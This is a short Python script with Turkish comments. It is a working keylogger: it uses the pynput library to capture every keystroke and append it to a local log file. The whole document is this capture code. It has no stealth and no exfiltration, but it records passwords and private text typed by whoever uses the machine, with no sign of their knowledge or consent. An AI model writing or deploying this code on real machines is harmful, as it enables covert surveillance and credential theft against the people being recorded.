import pynput

# Klavye tuşlarını dinleyen bir fonksiyon
def on_press(key):
    try:
        with open("log.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("log.txt", "a") as log_file:
            log_file.write(f"{key}")

# Dinleyici kurma
listener = pynput.keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
